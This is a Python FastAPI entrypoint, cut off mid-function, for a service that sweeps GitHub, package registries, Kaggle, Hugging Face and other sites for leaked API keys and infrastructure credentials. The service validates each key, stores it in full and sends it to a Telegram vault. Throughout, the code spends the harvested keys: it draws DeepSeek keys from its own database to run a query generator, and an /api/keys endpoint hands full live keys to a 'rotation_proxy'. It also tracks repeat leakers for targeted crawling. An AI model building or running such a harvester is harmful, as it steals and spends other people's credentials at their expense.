"""
FastAPI entrypoint.

Background tasks (all concurrent, independent):
  _scan_loop()          — code-search scanner, N parallel workers per PAT
  trufflehog_loop()     — org/user sweep via trufflehog (if configured)
  tg_bot.bot_loop()     — Telegram interactive Key Vault (inline keyboard)

Intentionally disabled:
  _flush_loop()         — 15-min roulette push (replaced by on-demand bot vault)
  _hourly_alert_loop()  — hourly digest push (replaced by on-demand bot vault)
"""

import asyncio
import html
import logging
import os
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta

from fastapi import Body, FastAPI, Header, HTTPException, Query
from fastapi.responses import HTMLResponse

import db
from config import (SCAN_INTERVAL, HOURLY_ALERT, GITHUB_TOKENS, MAX_PAGES,
                    INFRA_LOW_RISK_MAX_DAYS, DB_PATH)
from validators import VALIDATORS as EXTRACTORS_AVAILABLE  # actually validators dict
from scanner import run_cycle, _TOKEN_STATUS
from notifier import notify_hourly_digest, notify_infra_hourly, flush_unverified_buffer
from trufflehog_runner import trufflehog_loop
from gitee_scanner import gitee_loop
from events_scanner import events_loop
from gist_scanner import gists_loop
from kaggle_scanner import kaggle_loop
from hf_scanner import hf_loop
from codeberg_scanner import codeberg_loop
from postman_scanner import postman_loop
from npm_scanner import npm_loop
from pypi_scanner import pypi_loop
from commoncrawl_scanner import cc_loop
from author_scanner import author_walk_loop, walk_one_author, run_author_cycle
from tg_bot import bot_loop
from query_generator import generate_batch as generate_combo_batch, auto_blacklist_dead
from query_themer import generate_themed_batch
from vocab_expander import run_expansion_cycle

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
log = logging.getLogger(__name__)


async def _scan_loop():
    while True:
        try:
            await run_cycle()
        except Exception as e:
            log.error("cycle crashed: %s", e)
        log.info("sleeping %ds until next cycle", SCAN_INTERVAL)
        await asyncio.sleep(SCAN_INTERVAL)


async def _revalidation_loop():
    """
    Re-validate keys already in DB as is_valid=1 every 12 h.
    Catches quota expiry (Google free-tier resets daily but runs out quickly),
    depleted balances (DeepSeek/OpenAI), and revoked keys.
    Updates is_valid=0 + last_validated_at so the web UI and future reports
    reflect current reality, not the snapshot from when the key was first found.
    """
    from validators import validate as _validate
    while True:
        await asyncio.sleep(43200)  # 12 h
        try:
            rows = db.get_valid_keys_to_revalidate(max_age_hours=12)
            if not rows:
                continue
            n_dead = 0
            for row in rows:
                ok = await _validate(row["provider"], row["key_full"])
                db.update_key_validity(row["key_hash"], ok)
                if not ok:
                    n_dead += 1
            log.info("revalidation: %d/%d keys now dead, %d still alive",
                     n_dead, len(rows), len(rows) - n_dead)
        except Exception as e:
            log.error("revalidation loop err: %s", e)


async def _cleanup_loop():
    """Daily cleanup of old low-risk infra findings to keep DB size bounded."""
    while True:
        await asyncio.sleep(86400)  # once per day
        try:
            n = db.cleanup_old_low_risk(older_than_days=INFRA_LOW_RISK_MAX_DAYS)
            if n:
                log.info("cleanup: removed %d old low-risk infra findings (>%dd)",
                         n, INFRA_LOW_RISK_MAX_DAYS)
        except Exception as e:
            log.error("cleanup loop err: %s", e)


async def _flush_loop():
    """Flush buffered unverified keys to Telegram every 15 minutes."""
    while True:
        await asyncio.sleep(900)
        try:
            n = await flush_unverified_buffer()
            if n:
                log.info("flushed %d valid keys to Telegram as text file", n)
            else:
                log.debug("flush: buffer empty, nothing to send")
        except Exception as e:
            log.error("flush loop err: %s", e)


async def _query_rotation_loop():
    """
    Combinatorial query generator (Layer 1) — runs every 8h.

    Cheap deterministic Cartesian-product over PROVIDER_AXES + global axes
    (filenames × languages × time-windows × size-buckets). 15-day non-repeat
    enforced by db.get_recent_query_hashes pre-filter. Auto-blacklists
    queries with 5+ uses and zero yield (30d cooldown).
    """
    # Stagger initial run so we don't slam DB during boot — wait 5 min so
    # the scanner has time to warm caches and the first cycle is underway.
    await asyncio.sleep(300)
    while True:
        try:
            inserted = await asyncio.to_thread(generate_combo_batch)
            blacklisted = await asyncio.to_thread(auto_blacklist_dead)
            log.info("query_rotation: +%d combo queries | %d auto-blacklisted",
                     inserted, blacklisted)
        except Exception as e:
            log.error("query_rotation crashed: %s", e)
        await asyncio.sleep(8 * 3600)   # 8h


async def _themer_loop():
    """
    DeepSeek-driven creative query generator (Layer 3) — runs every 8h.

    Produces ~25 highly-targeted queries per batch using the model's
    knowledge of new model releases, geo-linguistic patterns, niche file
    types, and yield-feedback from prior batches. Uses valid DeepSeek keys
    from our own DB with auto-rotation on 401/402.

    Local probe verified: deepseek-v4-pro effort=max produces juice
    (multi-provider OR-combos, Chinese 密钥, .cursor/mcp.json, claude-opus-4
    model anchors). Each batch takes 4-7 min and ~$0.015.
    """
    # Stagger 4h offset from the combinatorial loop so they don't slam
    # the DB / network simultaneously.
    await asyncio.sleep(4 * 3600)
    while True:
        try:
            inserted = await generate_themed_batch()
            log.info("themer: +%d themed queries inserted", inserted)
        except Exception as e:
            log.error("themer crashed: %s", e)
        await asyncio.sleep(8 * 3600)   # 8h


async def _vocab_expander_loop():
    """
    AI vocabulary expander (Layer 2) — runs every 24h.

    For each provider with valid keys in DB, fetches up to 20 recent
    valid-key files, sends them to DeepSeek with a structured extraction
    prompt, and writes new env_names / filenames / context_words to
    axis_extensions. Picked up automatically by the next combinatorial
    generator cycle — no code changes needed when DeepSeek discovers a
    new naming convention in real leaked files.
    """
    # Wait 1h after boot so vocab discovery has fresh data to chew on
    # (initial scan should yield some valid keys by then).
    await asyncio.sleep(3600)
    while True:
        try:
            summary = await run_expansion_cycle()
            log.info("vocab_expander: %s", summary)
        except Exception as e:
            log.error("vocab_expander crashed: %s", e)
        await asyncio.sleep(24 * 3600)   # 24h


async def _hourly_alert_loop():
    if not HOURLY_ALERT:
        return
    while True:
        await asyncio.sleep(3600)
        try:
            since      = (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat()
            by_prov    = db.get_keys_since(since)
            new_valid  = db.get_valid_since(since)
            total_new  = sum(r["cnt"] for r in by_prov)
            total_valid = sum(r["valid_cnt"] for r in by_prov)
            await notify_hourly_digest(by_prov, total_new, total_valid, new_valid)
            log.info("hourly digest: %d new keys", total_new)

            # Infra credentials hourly digest
            infra_rows  = db.get_infra_since(since)
            infra_total = sum(r["cnt"] for r in infra_rows)
            infra_high  = sum(r.get("high_cnt", 0) for r in infra_rows)
            await notify_infra_hourly(infra_rows, infra_total, infra_high)
        except Exception as e:
            log.error("hourly alert err: %s", e)


@asynccontextmanager
async def lifespan(app: FastAPI):
    db.init_db()
    tasks = [
        asyncio.create_task(_scan_loop(),           name="scan_loop"),
        asyncio.create_task(_cleanup_loop(),        name="db_cleanup"),
        asyncio.create_task(_revalidation_loop(),   name="revalidation"),
        asyncio.create_task(trufflehog_loop(),      name="trufflehog"),
        asyncio.create_task(gitee_loop(),           name="gitee_scanner"),
        asyncio.create_task(events_loop(),          name="events_scanner"),
        asyncio.create_task(gists_loop(),           name="gists_scanner"),
        asyncio.create_task(kaggle_loop(),          name="kaggle_scanner"),
        asyncio.create_task(hf_loop(),              name="hf_scanner"),
        asyncio.create_task(codeberg_loop(),        name="codeberg_scanner"),
        asyncio.create_task(postman_loop(),         name="postman_scanner"),
        asyncio.create_task(npm_loop(),             name="npm_scanner"),
        asyncio.create_task(pypi_loop(),            name="pypi_scanner"),
        asyncio.create_task(cc_loop(),              name="commoncrawl_scanner"),
        asyncio.create_task(author_walk_loop(),     name="author_walk"),
        asyncio.create_task(_query_rotation_loop(), name="query_rotation"),
        asyncio.create_task(_themer_loop(),         name="query_themer"),
        asyncio.create_task(_vocab_expander_loop(), name="vocab_expander"),
        asyncio.create_task(bot_loop(),             name="tg_bot"),
    ]
    yield
    for t in tasks:
        t.cancel()


app = FastAPI(title="GitHub Key Scanner", lifespan=lifespan)

# Optional admin secret for mutating endpoints (/admin/vacuum).
# Set ADMIN_TOKEN on Railway; if not set, endpoint is open (acceptable for private deploys).
_ADMIN_TOKEN: str = os.environ.get("ADMIN_TOKEN", "")


def _check_admin(authorization: str | None):
    if not _ADMIN_TOKEN:
        return  # not configured — open access
    if authorization != f"Bearer {_ADMIN_TOKEN}":
        raise HTTPException(status_code=401, detail="Unauthorized")


# Separate token for hermes-bounty's rotation_proxy. Keeping it distinct from
# ADMIN_TOKEN means a leak of one doesn't grant the other, and lets us revoke
# the bounty bridge without locking the admin panel.
_ROTATION_TOKEN: str = os.environ.get("ROTATION_API_TOKEN", "")

# Only providers used by Hermes are exposed via /api/keys — even with a leaked
# token, an attacker can't enumerate every provider in the DB this way.
_ROTATION_ALLOWED_PROVIDERS = frozenset({"deepseek", "kimi", "glm"})


def _check_rotation(authorization: str | None) -> None:
    if not _ROTATION_TOKEN:
        raise HTTPException(503, detail="ROTATION_API_TOKEN not configured")
    if authorization != f"Bearer {_ROTATION_TOKEN}":
        raise HTTPException(401, detail="Unauthorized")


# ── Web UI ─────────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def root():
    stats = db.get_stats()
    rows  = db.get_results(valid_only=False, limit=100)

    by_prov_html = ""
    for row in stats.get("by_provider", []):
        by_prov_html += (
            f"<tr><td>{row['provider'].upper()}</td>"
            f"<td>{row['total']}</td>"
            f"<td style='color:#4caf50'>{row['valid']}</td></tr>"
        )

    rows_html = ""
    for r in rows:
        badge    = "✅" if r["is_valid"] else "⚠️"
        repo_e   = html.escape(r["repo"])
        path_e   = html.escape(r["file_path"])
        prov_e   = html.escape(r["provider"])
        key_e    = html.escape(r["key_preview"])
        ftype_e  = html.escape(r["file_type"])
        rows_html += (
            f"<tr><td>{badge}</td>"
            f"<td>{prov_e}</td>"
            f"<td><code>{key_e}</code></td>"
            f"<td><a href='https://github.com/{repo_e}' target='_blank'>{repo_e}</a></td>"
            f"<td>⭐{r['repo_stars']}</td>"
            f"<td>{ftype_e}</td>"
            f"<td>{r['discovered_at'][:16]}</td></tr>\n"
        )

    n_tokens = len(GITHUB_TOKENS)
    return f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>Key Scanner</title>
<style>
  body{{font-family:monospace;background:#111;color:#eee;padding:20px}}
  table{{border-collapse:collapse;width:100%;margin-bottom:20px}}
  th,td{{border:1px solid #333;padding:6px 10px;text-align:left}}
  th{{background:#222}}tr:hover{{background:#1a1a1a}}
  a{{color:#58a6ff}}code{{background:#222;padding:2px 5px;border-radius:3px}}
  .stat{{display:inline-block;margin:0 16px 8px 0;font-size:1.1em}}
  h3{{color:#aaa;margin-top:28px;border-bottom:1px solid #333;padding-bottom:6px}}
  .badge{{font-size:.8em;background:#1e3a5f;color:#58a6ff;padding:2px 6px;border-radius:4px}}
</style></head><body>
<h2>🔍 GitHub Key Scanner
  <span class='badge'>{n_tokens} token{"s" if n_tokens!=1 else ""} · {MAX_PAGES} pages/query</span>
</h2>
<p>
  <span class='stat'>Repos: <b>{stats['repos_scanned']}</b></span>
  <span class='stat'>Files: <b>{stats['files_scanned']}</b></span>
  <span class='stat'>Keys: <b>{stats['keys_found']}</b></span>
  <span class='stat'>Valid: <b style='color:#4caf50'>{stats['keys_valid']}</b></span>
</p>
<h3>By Provider</h3>
<table style='width:auto'>
  <thead><tr><th>Provider</th><th>Found</th><th>Valid</th></tr></thead>
  <tbody>{by_prov_html}</tbody>
</table>
<p><a href='/infra'>🏗️ Infrastructure Credentials →</a></p>
<h3>Recent 100 Keys</h3>
<table>
  <thead><tr><th>Status</th><th>Provider</th><th>Key</th>
  <th>Repo</th><th>Stars</th><th>Type</th><th>Found at</th></tr></thead>
  <tbody>{rows_html}</tbody>
</table>
</body></html>"""


@app.get("/stats")
async def stats():
    return db.get_stats()


@app.get("/results")
async def results(valid_only: bool = Query(False), limit: int = Query(200)):
    return db.get_results(valid_only=valid_only, limit=limit)


@app.get("/infra", response_class=HTMLResponse)
async def infra_page(risk: str = Query(None), limit: int = Query(200)):
    istats = db.get_infra_stats()
    rows   = db.get_infra_results(risk_filter=risk, limit=limit)

    _RISK_COLOR = {"high": "#ff4444", "medium": "#ffaa00", "low": "#888"}
    _RISK_BG    = {"high": "#2a0000", "medium": "#1a1200", "low": "#111"}

    by_type_html = ""
    for row in istats.get("by_type", []):
        by_type_html += (
            f"<tr><td>{row['cred_type'].upper()}</td>"
            f"<td>{row['total']}</td>"
            f"<td style='color:#ff4444'>{row['high_risk']}</td>"
            f"<td style='color:#ffaa00'>{row['med_risk']}</td></tr>"
        )

    by_dest_html = ""
    for row in istats.get("by_dest", [])[:10]:
        by_dest_html += (
            f"<tr><td><code>{row['destination']}</code></td>"
            f"<td>{row['cred_type']}</td>"
            f"<td>{row['cnt']}</td></tr>"
        )

    rows_html = ""
    for r in rows:
        rl       = r.get("risk_level", "low")
        col      = _RISK_COLOR.get(rl, "#888")
        bg       = _RISK_BG.get(rl, "#111")
        dest_raw = r.get("destination", "")
        dest     = f"<code>{html.escape(dest_raw)}</code>" if dest_raw else "—"
        v        = r.get("is_validated", -1)
        val_badge = ("✅" if v == 1 else "❌" if v == 0 else "⏳")
        repo_e    = html.escape(r["repo"])
        ctype_e   = html.escape(r["cred_type"].upper())
        prev_e    = html.escape(r["cred_preview"])
        ftype_e   = html.escape(r["file_type"])
        rows_html += (
            f"<tr style='background:{bg}'>"
            f"<td style='color:{col};font-weight:bold'>{rl.upper()}</td>"
            f"<td>{val_badge}</td>"
            f"<td>{ctype_e}</td>"
            f"<td><code>{prev_e}</code></td>"
            f"<td>{dest}</td>"
            f"<td><a href='https://github.com/{repo_e}' target='_blank'>{repo_e}</a></td>"
            f"<td>⭐{r['repo_stars']}</td>"
            f"<td>{ftype_e}</td>"
            f"<td>{r['discovered_at'][:16]}</td></tr>\n"
        )

    filter_links = (
        "<a href='/infra'>All</a> · "
        "<a href='/infra?risk=high' style='color:#ff4444'>High</a> · "
        "<a href='/infra?risk=medium' style='color:#ffaa00'>Medium</a> · "
        "<a href='/infra?risk=low' style='color:#888'>Low</a>"
    )

    return f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>Infra Credentials</title>
<style>
  body{{font-family:monospace;background:#111;color:#eee;padding:20px}}
  table{{border-collapse:collapse;width:100%;margin-bottom:20px}}
  th,td{{border:1px solid #333;padding:6px 10px;text-align:left}}
  th{{background:#222}}tr:hover{{filter:brightness(1.2)}}
  a{{color:#58a6ff}}code{{background:#222;padding:2px 5px;border-radius:3px}}
  .stat{{display:inline-block;margin:0 16px 8px 0;font-size:1.1em}}
  h3{{color:#aaa;margin-top:28px;border-bottom:1px solid #333;padding-bottom:6px}}
</style></head><body>
<h2>🏗️ Infrastructure Credentials</h2>
<p>
  <span class='stat'>Total: <b>{istats['total']}</b></span>
  <span class='stat' style='color:#ff4444'>High risk: <b>{istats['high']}</b></span>
  <span class='stat' style='color:#ffaa00'>Medium: <b>{istats['medium']}</b></span>
</p>
<p>{filter_links}</p>
<h3>By Type</h3>
<table style='width:auto'>
  <thead><tr><th>Type</th><th>Total</th><th>High</th><th>Medium</th></tr></thead>
  <tbody>{by_type_html}</tbody>
</table>
{"<h3>Top Destinations</h3><table style='width:auto'><thead><tr><th>Host</th><th>Type</th><th>Count</th></tr></thead><tbody>" + by_dest_html + "</tbody></table>" if by_dest_html else ""}
<h3>Findings ({risk or "all"}, limit {limit})</h3>
<table>
  <thead><tr><th>Risk</th><th>Valid</th><th>Type</th><th>Preview</th><th>Destination</th>
  <th>Repo</th><th>Stars</th><th>File type</th><th>Found at</th></tr></thead>
  <tbody>{rows_html}</tbody>
</table>
<p><a href='/'>← AI Keys</a></p>
</body></html>"""


@app.get("/infra/stats")
async def infra_stats():
    return db.get_infra_stats()


@app.get("/check-tokens")
async def check_tokens():
    """Live-check all configured tokens across all platforms. All requests run in parallel."""
    import httpx as _httpx
    from config import (GITHUB_TOKENS, GITEE_TOKENS, CODEBERG_TOKENS,
                        HF_TOKEN, KAGGLE_TOKENS, POSTMAN_TOKENS)

    async def _check(c, label, url, headers=None, params=None):
        try:
            r = await c.get(url, headers=headers or {}, params=params or {})
            if r.status_code == 200:
                try:
                    d = r.json()
                except Exception:
                    d = {}
                return {"token": label, "status": "ok", "data": d}
            return {"token": label, "status": f"dead ({r.status_code})", "body": r.text[:150]}
        except Exception as e:
            return {"token": label, "status": f"error: {type(e).__name__}: {str(e)[:100]}"}

    async with _httpx.AsyncClient(timeout=10, follow_redirects=True) as c:
        tasks = {}

        for tok in GITHUB_TOKENS:
            tasks[f"gh:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://api.github.com/user",
                headers={"Authorization": f"token {tok}", "User-Agent": "ghscan/1.0"})

        for tok in CODEBERG_TOKENS:
            tasks[f"cb:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://codeberg.org/api/v1/user",
                headers={"Authorization": f"token {tok}", "User-Agent": "Mozilla/5.0"})

        for tok in GITEE_TOKENS:
            tasks[f"gt:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://gitee.com/api/v5/user", params={"access_token": tok})

        if HF_TOKEN:
            tasks["hf"] = _check(c, HF_TOKEN[:12] + "...",
                "https://huggingface.co/api/whoami-v2",
                headers={"Authorization": f"Bearer {HF_TOKEN}"})

        for tok in KAGGLE_TOKENS:
            tasks[f"kg:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://www.kaggle.com/api/v1/kernels/list",
                headers={"Authorization": f"Bearer {tok}"},
                params={"pageSize": 1, "sortBy": "hotness", "language": "python"})

        for tok in POSTMAN_TOKENS:
            tasks[f"pm:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://api.postman.com/me",
                headers={"X-Api-Key": tok})

        raw = await asyncio.gather(*tasks.values())
        tagged = dict(zip(tasks.keys(), raw))

    def _group(prefix):
        return [v for k, v in tagged.items() if k.startswith(prefix)]

    return {
        "github":      _group("gh:"),
        "codeberg":    _group("cb:"),
        "gitee":       _group("gt:"),
        "huggingface": tagged.get("hf", "not configured"),
        "kaggle":      _group("kg:"),
        "postman":     _group("pm:"),
    }


@app.get("/health")
async def health():
    alive   = sum(1 for s in _TOKEN_STATUS.values() if s.get("alive", True))
    total_t = len(GITHUB_TOKENS)
    db_mb   = round(os.path.getsize(DB_PATH) / 1024 / 1024, 2) if os.path.exists(DB_PATH) else 0
    return {
        "ok":     alive > 0,
        "tokens": {
            "total": total_t,
            "alive": alive if _TOKEN_STATUS else "unchecked",
            "dead":  total_t - alive if _TOKEN_STATUS else 0,
            "status": {
                k: {
                    "alive":              v.get("alive"),
                    "search_remaining":   v.get("remaining"),
                    "search_limit":       v.get("limit"),
                    "core_remaining":     v.get("core_remaining"),
                    "core_limit":         v.get("core_limit"),
                    "core_blocked_until": v.get("core_blocked_until", 0),
                }
                for k, v in _TOKEN_STATUS.items()
            },
        },
        "db_mb":        db_mb,
        "files_scanned": db.get_stats().get("files_scanned", 0),
    }


# ── Rotation API for hermes-bounty rotation_proxy ─────────────────────────
# Allows the bounty project's rotation_proxy to pull live valid keys for
# Hermes-supported providers and report dead keys back. Endpoints are
# whitelisted to {deepseek, kimi, glm} so this token can't be used to dump
# every provider's keys.

@app.get("/api/keys")
async def api_keys_list(
    provider: str = Query(..., description="One of: deepseek, kimi, glm"),
    authorization: str | None = Header(default=None),
):
    _check_rotation(authorization)
    if provider not in _ROTATION_ALLOWED_PROVIDERS:
        raise HTTPException(400, detail=f"provider must be one of {sorted(_ROTATION_ALLOWED_PROVIDERS)}")
    rows = db.get_valid_keys_by_provider(provider)
    return [{"hash": r["key_hash"], "key": r["key_full"]} for r in rows]


@app.post("/api/keys/dead")
async def api_keys_dead(
    payload: dict = Body(...),
    authorization: str | None = Header(default=None),
):
    """rotation_proxy reports a key returned 401/402/insufficient_quota.
    We mark is_valid=0; the regular re-validation loop will sweep it up later."""
    _check_rotation(authorization)
    h = (payload.get("hash") or "").strip()
    if not h:
        raise HTTPException(400, detail="missing 'hash'")
    db.update_key_validity(h, False)
    return {"ok": True}


@app.post("/admin/revalidate")
async def admin_revalidate(authorization: str | None = Header(default=None)):
    """
    Re-validate ALL keys currently marked is_valid=1 right now (don't wait for the 12h loop).
    Updates is_valid=0 + last_validated_at for keys that no longer pass.
    Use after bulk imports, or to instantly clean up stale valid flags.
    """
    _check_admin(authorization)
    from validators import validate as _validate
    # max_age_hours=0 → cutoff=now → everything with NULL or any past time qualifies
    rows = db.get_valid_keys_to_revalidate(max_age_hours=0, limit=2000)
    results: dict[str, list[str]] = {"dead": [], "alive": []}
    for row in rows:
        ok = await _validate(row["provider"], row["key_full"])
        db.update_key_validity(row["key_hash"], ok)
        results["dead" if not ok else "alive"].append(
            f"{row['provider']}:{row['key_full'][:16]}…"
        )
    log.info("admin revalidate: %d dead, %d alive out of %d checked",
             len(results["dead"]), len(results["alive"]), len(rows))
    return {
        "checked":    len(rows),
        "now_dead":   len(results["dead"]),
        "still_alive": len(results["alive"]),
        "dead_keys":  results["dead"],
    }


@app.post("/admin/fix_ark")
async def admin_fix_ark(authorization: str | None = Header(default=None)):
    """
    Reclassify existing 'ark' is_valid=1 keys by probing which 2.0 model they can access:
      • 2.0-fast accessible → update provider to 'ark_fast'
      • 2.0-standard only   → keep provider as 'ark'
      • neither (1.0 only)  → mark is_valid=0
    Run once after deploying the ark_fast split to fix legacy DB entries.
    """
    _check_admin(authorization)
    from validators import validate_ark_fast as _vfast, validate_ark as _vstd
    rows = db.get_valid_keys_by_provider("ark")
    results = {"ark_fast": [], "ark": [], "invalidated": []}
    for row in rows:
        key  = row["key_full"]
        khash = row["key_hash"]
        if await _vfast(key):
            db.update_key_provider(khash, "ark_fast")
            db.update_key_validity(khash, True)
            results["ark_fast"].append(key[:16] + "…")
        elif await _vstd(key):
            db.update_key_validity(khash, True)   # provider stays 'ark'
            results["ark"].append(key[:16] + "…")
        else:
            db.update_key_validity(khash, False)  # 1.0-only → dead
            results["invalidated"].append(key[:16] + "…")
    log.info("fix_ark: %d→ark_fast, %d→ark, %d invalidated",
             len(results["ark_fast"]), len(results["ark"]), len(results["invalidated"]))
    return results


@app.post("/admin/validate_keys")
async def admin_validate_keys(
    body: dict, authorization: str | None = Header(default=None)
):
    """
    Batch-validate a list of keys + save to DB. For ingesting credential dumps
    found by manual review (decoded base64 obfuscation, etc.).

    Request body:
      {
        "source": "manual",                   # used as file_type label
        "items": [
          {"provider": "openrouter", "key": "sk-or-v1-...", "repo": "owner/name", "path": "config.js"},
          ...
        ]
      }

    Response: per-item result {provider, preview, is_valid, saved, error}.
    """
    _check_admin(authorization)
    items   = body.get("items") or []
    src_lbl = (body.get("source") or "manual_dump")[:30]

    from validators import validate as _validate

    out: list[dict] = []
    n_saved = n_valid = n_dupe = n_no_validator = 0

    for entry in items:
        if not isinstance(entry, dict):
            continue
        prov = (entry.get("provider") or "").strip()
        key  = (entry.get("key") or "").strip()
        if not prov or not key:
            continue
        if prov not in EXTRACTORS_AVAILABLE:
            out.append({"provider": prov, "preview": key[:14] + "...",
                        "is_valid": None, "saved": False,
                        "error": "no_validator"})
            n_no_validator += 1
            continue
        if db.key_exists(key):
            out.append({"provider": prov, "preview": key[:14] + "...",
                        "is_valid": None, "saved": False, "error": "duplicate"})
            n_dupe += 1
            continue
        try:
            is_valid = await _validate(prov, key)
        except Exception as e:
            out.append({"provider": prov, "preview": key[:14] + "...",
                        "is_valid": None, "saved": False,
                        "error": f"validate_err:{type(e).__name__}"})
            continue
        repo = (entry.get("repo")     or "manual")[:200]
        path = (entry.get("path")     or "")[:200]
        url  = (entry.get("file_url") or entry.get("url") or "")[:500]
        saved = db.save_key(prov, key, repo, path, url, 0, "", src_lbl, is_valid)
        if saved:
            n_saved += 1
            if is_valid:
                n_valid += 1
        out.append({"provider": prov, "preview": key[:14] + "...",
                    "is_valid": is_valid, "saved": saved})

    return {
        "checked":      len(items),
        "saved":        n_saved,
        "valid":        n_valid,
        "duplicate":    n_dupe,
        "no_validator": n_no_validator,
        "results":      out,
    }


@app.post("/admin/refilter_infra")
async def admin_refilter_infra(authorization: str | None = Header(default=None)):
    """
    Re-apply the current _FAKE / _is_template_dsn filter to all existing
    infra_findings. Deletes rows that wouldn't be saved under today's rules
    (templates, mocks, env-var interpolations).

    Run after tightening the infra fake filter — backfills the cleanup that
    only takes effect on NEW finds otherwise.
    """
    _check_admin(authorization)
    from infra_patterns import _is_fake, _is_template_dsn

    def _filter():
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        try:
            rows = conn.execute(
                "SELECT id, cred_full FROM infra_findings"
            ).fetchall()
            to_delete: list[int] = []
            for r in rows:
                cred = r["cred_full"] or ""
                if _is_fake(cred):
                    to_delete.append(r["id"])
                    continue
                # Database DSNs without @ are templates
                if "://" in cred and "@" not in cred and _is_template_dsn(cred):
                    to_delete.append(r["id"])
                    continue
            if to_delete:
                # SQLite IN(...) cap: chunk by 500
                for i in range(0, len(to_delete), 500):
                    chunk = to_delete[i:i+500]
                    placeholders = ",".join("?" * len(chunk))
                    conn.execute(
                        f"DELETE FROM infra_findings WHERE id IN ({placeholders})",
                        chunk,
                    )
                conn.commit()
            return {"total": len(rows), "deleted": len(to_delete)}
        finally:
            conn.close()

    result = await asyncio.to_thread(_filter)
    log.info("admin refilter_infra: %d/%d removed",
             result["deleted"], result["total"])
    return {"ok": True, **result}


@app.post("/admin/cleanup_axes")
async def admin_cleanup_axes(authorization: str | None = Header(default=None)):
    """One-time cleanup — reapply the current vocab_expander filter to
    existing axis_extensions rows. Drops entries that would NOT survive
    the post-2026-05-04 filter:
      - env_names ending in _MODEL / _URL / _ENDPOINT / _BASE / _VERSION /
        _REGION / _PROJECT / _ORG / _NAMESPACE / _DEPLOYMENT / _TIMEOUT etc
        (config vars, not secret-bearing)
      - generic noise filenames (api-key.js, main.py, app.py, etc)
      - generic context_words (key, secret, auth, model, ...)
    Run after deploying the filter tightening to scrub historic pollution.
    """
    _check_admin(authorization)
    from vocab_expander import _filter_new

    def _do() -> dict:
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        try:
            rows = conn.execute(
                "SELECT id, provider, axis, value FROM axis_extensions"
            ).fetchall()
            to_delete: list[int] = []
            for r in rows:
                # _filter_new returns [] if value would be rejected. We pass
                # a single-element list with empty `current` set so the only
                # rejection is the shape filter.
                kept = _filter_new(r["provider"], r["axis"], [r["value"]], set())
                if not kept:
                    to_delete.append(r["id"])
            for i in range(0, len(to_delete), 500):
                chunk = to_delete[i:i + 500]
                ph = ",".join("?" * len(chunk))
                conn.execute(
                    f"DELETE FROM axis_extensions WHERE id IN ({ph})", chunk
                )
            conn.commit()
            return {"total": len(rows), "deleted": len(to_delete)}
        finally:
            conn.close()

    result = await asyncio.to_thread(_do)
    log.info("admin cleanup_axes: removed %d/%d polluted rows",
             result["deleted"], result["total"])
    return {"ok": True, **result}


@app.post("/admin/reset_file_claims")
async def admin_reset_file_claims(authorization: str | None = Header(default=None)):
    """
    Drop all SHA-based file dedup claims. After this, next scan cycle will
    re-fetch ALL previously-scanned files and re-run them through the (now
    expanded) extractor set. Use after adding new providers or extending
    regex patterns to backfill findings from existing repos.

    Does NOT delete found_keys — db.key_exists() still de-dups by key value.
    """
    _check_admin(authorization)
    n = await asyncio.to_thread(db.clear_scanned_files)
    log.info("admin reset_file_claims: cleared %d rows from scanned_files", n)
    return {"ok": True, "cleared": n}


@app.post("/admin/vacuum")
async def admin_vacuum(authorization: str | None = Header(default=None)):
    """Full SQLite VACUUM — repacks DB file after bulk deletes. Takes a few seconds."""
    _check_admin(authorization)
    before = os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0

    def _do():
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
        conn.execute("VACUUM")
        conn.close()

    await asyncio.to_thread(_do)
    after = os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0
    return {
        "ok":       True,
        "before_mb": round(before / 1024 / 1024, 2),
        "after_mb":  round(after  / 1024 / 1024, 2),
        "freed_mb":  round((before - after) / 1024 / 1024, 2),
    }


@app.get("/admin/watched_authors")
async def admin_watched_authors(
    only_watched: bool = True,
    limit: int = 100,
    authorization: str | None = Header(default=None),
):
    """Top serial leakers (auto-promoted at >=3 leaks). Sorted by valid_count
    desc, then leak_count desc. Set only_watched=false to also see authors
    below the watch threshold."""
    _check_admin(authorization)
    rows = db.get_watched_authors(limit=limit, only_watched=only_watched)
    return {
        "count": len(rows),
        "items": rows,
    }


@app.post("/admin/walk_author/{login}")
async def admin_walk_author(
    login: str,
    platform: str = "github",
    max_repos: int = 30,
    authorization: str | None = Header(default=None),
):
    """Manually trigger repo tree-walk for one author's public repos.

    Lists all the user's repos, runs walk_repo_tree on those that haven't
    been walked yet. Capped at `max_repos` per call. Returns counts of
    repos walked vs skipped (already-walked).
    """
    _check_admin(authorization)
    import httpx
    async with httpx.AsyncClient(timeout=30, follow_redirects=True) as c:
        result = await walk_one_author(c, login, platform, max_repos=max_repos)
    return {"ok": "error" not in result, "login": login, **result}


_AUTHOR_CYCLE_RUNNING: bool = False
_AUTHOR_CYCLE_LAST_RESULT: dict = {}


@app.post("/admin/run_author_cycle")
async def admin_run_author_cycle(
    authorization: str | None = Header(default=None),
):
    """Manually trigger one author-walk batch cycle (instead of waiting 24h).

    Fire-and-forget: returns immediately while the cycle runs in
    background. Walking 30 authors × ~30 repos × ~30 file fetches takes
    well over Railway's 300s gateway timeout, so we cannot await here.

    Poll /admin/author_cycle_status to see when it finishes and the
    result counters.
    """
    _check_admin(authorization)
    global _AUTHOR_CYCLE_RUNNING
    if _AUTHOR_CYCLE_RUNNING:
        return {"ok": False, "error": "cycle already running",
                "last_result": _AUTHOR_CYCLE_LAST_RESULT}

    async def _bg():
